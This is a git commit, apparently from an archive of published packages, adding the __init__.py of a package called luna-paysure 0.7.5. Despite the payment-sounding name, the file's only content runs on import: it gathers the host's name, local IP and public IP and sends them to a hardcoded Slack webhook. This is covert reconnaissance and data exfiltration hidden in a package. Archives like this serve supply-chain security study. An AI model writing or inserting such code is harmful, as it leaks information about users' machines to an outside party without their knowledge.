49e8e1a64ec54b0b335ede25f98dca3e9c6781b6
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-10-14 16:05:15 +0000

    Add package luna-paysure/0.7.5/luna_paysure-0.7.5.tar.gz

---
+++ packages/luna-paysure/luna_paysure-0.7.5.tar.gz/luna_paysure-0.7.5/luna_paysure/__init__.py
@@ -0,0 +1,9 @@
+import requests
+import socket
+
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
+
+ip = requests.get('https://api.ipify.org').content.decode('utf8')
+
+r = requests.post('https://hooks.slack.com/services/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', json={"text": f"I like spaghetti with ketchup: {hostname}/{IPAddr}/{ip}"})
